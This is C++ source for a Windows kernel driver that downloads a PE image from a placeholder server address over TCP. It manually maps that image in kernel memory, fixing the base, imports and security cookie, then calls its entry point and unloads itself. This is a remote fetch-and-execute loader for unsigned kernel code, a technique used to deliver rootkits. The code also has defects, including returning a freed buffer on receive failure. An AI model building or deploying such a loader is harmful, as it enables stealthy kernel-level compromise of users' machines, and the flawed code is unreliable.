#include <ntifs.h>

#include "Utils.h"

#include "DrvMemLoader.h"

#include <libwsk.h>

void DriverUnload(PDRIVER_OBJECT DriverObject)
{
    
}

PUCHAR GetFileDataByServer(const PWCHAR Ip, const PWCHAR Port, SIZE_T* DataSize)
{
    NTSTATUS status = STATUS_SUCCESS;
    PADDRINFOEXW AddrInfo = nullptr;
    PUCHAR imageBuffer = nullptr;
    SOCKET clientSocket = -1;

    do {
    
        WSKDATA WSKData = { 0 };
        status = WSKStartup(MAKE_WSK_VERSION(1, 0), &WSKData);
        if (!NT_SUCCESS(status))
        {
            break;
        }

        ADDRINFOEXW hints = { 0 };
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;


        //        Status = StartWSKClient(nullptr, L"20211", AF_INET, SOCK_STREAM);

        status = WSKGetAddrInfo(Ip, Port, NS_ALL, nullptr,
            &hints, &AddrInfo, WSK_INFINITE_WAIT, nullptr, nullptr);
        if (!NT_SUCCESS(status))
        {
            break;
        }


        status = WSKSocket(&clientSocket, (ADDRESS_FAMILY)(AddrInfo->ai_family),
            (USHORT)(AddrInfo->ai_socktype), AddrInfo->ai_protocol, nullptr);
        if (!NT_SUCCESS(status))
        {
            break;
        }

        status = WSKConnect(clientSocket, AddrInfo->ai_addr, AddrInfo->ai_addrlen);;
        if (!NT_SUCCESS(status))
        {
            break;
        }

        SIZE_T sent = 0;
        status = WSKSend(clientSocket, "REQUEST DATA", strlen("REQUEST DATA") + 1, &sent, 0, nullptr, nullptr);
        if (!NT_SUCCESS(status))
        {
            break;
        }

        SIZE_T fileSize = 0;
        SIZE_T recevied = 0;
        SIZE_T receviedTotal = 0;

        status = WSKReceive(clientSocket, &fileSize, sizeof(fileSize), &recevied, 0, nullptr, nullptr);
        if (!NT_SUCCESS(status))
        {
            break;
        }

        if (DataSize)
        {
            *DataSize = fileSize;
        }

        PUCHAR buffer = reinterpret_cast<PUCHAR>(ExAllocatePool(PagedPool, fileSize));
        memset(buffer, 0, fileSize);

        while (receviedTotal < fileSize)
        {
            UINT32 wannaLen = 0;

            UINT32 remain = fileSize - receviedTotal;
            if (remain == 0)
            {
                break;
            }

            wannaLen = remain < PAGE_SIZE ? (remain % PAGE_SIZE) : PAGE_SIZE;

            recevied = 0;

            status = WSKReceive(clientSocket, buffer + receviedTotal, wannaLen, &recevied, 0, nullptr, nullptr);
            if (!NT_SUCCESS(status))
            {
                break;
            }

            receviedTotal += recevied;
        }

        if (!NT_SUCCESS(status))
        {
            ExFreePool(buffer);
        }

        imageBuffer = buffer;

    } while (false);


    WSKDisconnect(clientSocket, 0);
    WSKCloseSocket(clientSocket);
    WSKFreeAddrInfo(AddrInfo);

    WSKCleanup();

    return imageBuffer;
}

NTSTATUS DumpMemoryToFile(const PWCHAR Path, PUCHAR Buffer, SIZE_T BufferSize)
{
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE hFile = nullptr;
    OBJECT_ATTRIBUTES objAttri{0};
    IO_STATUS_BLOCK ioBlock{ 0 };

    UNICODE_STRING filePath = { 0 };

    RtlInitUnicodeString(&filePath, Path);
    
    InitializeObjectAttributes(&objAttri, &filePath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = ZwCreateFile(&hFile, GENERIC_ALL, &objAttri, &ioBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_CREATE, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_ALERT, nullptr, 0);
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    status = ZwWriteFile(hFile, NULL, NULL, NULL, &ioBlock, Buffer, BufferSize, 0, nullptr);
    
    ZwClose(hFile);

    return status;
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    NTSTATUS status = STATUS_SUCCESS;

    DriverObject->DriverUnload = DriverUnload;

    KdBreakPoint();

    SIZE_T fileSize = 0;
    PUCHAR fileData = GetFileDataByServer(L"xxx.xxx.xxx.xxx", L"8086", &fileSize);

    DrvMemLoader loader;
    
    loader.InitDrv(fileData, fileSize);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PEData: %p\n", loader.GetImageBuffer());

    loader.FixImageBase();

    loader.FixIAT();

    loader.FixSecurityCookie();

    loader.CallEntryPoint();

    if (fileData)
    {
        ExFreePool(fileData);
    }

    return STATUS_UNSUCCESSFUL;
}
